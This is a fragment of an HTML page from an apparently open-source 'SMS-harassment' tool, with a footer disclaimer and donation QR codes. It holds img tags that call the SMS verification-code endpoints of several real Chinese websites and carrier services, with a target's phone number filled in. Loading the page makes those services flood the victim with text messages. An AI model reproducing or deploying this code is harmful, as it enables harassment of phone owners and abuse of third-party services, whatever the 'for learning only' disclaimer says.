...
<img src='http://m.jiameng.com/sendRegCode.html?mobilePhone=$tel' alt=''/>
<img src='http://mobile.ind4.net/wap/member/sendRegSms.do?t=1566557536580&phoneNumber=$tel' alt=''/>
<img src='http://uac.10010.com/oauth2/OpSms?callback=jsonp1566660717436&req_time=1566660731486&user_id=$tel&app_code=MOBILE_MALL' alt=''/>
</div>
	";
...
<p>本程序只用于学习,交流。</p>
<p class="h">请不要用于非法!</p>
<a class="url" href="https://github.com/2016xyz/SMS-harassment">开源地址</a>
<p class="rewards">打赏: <a><img src="wx.jpg" alt="微信收款二维码">微信</a>, <a><img src="zfb.jpg" alt="支付宝收款二维码">支付宝</a></p>    
</div>
</body>
</html>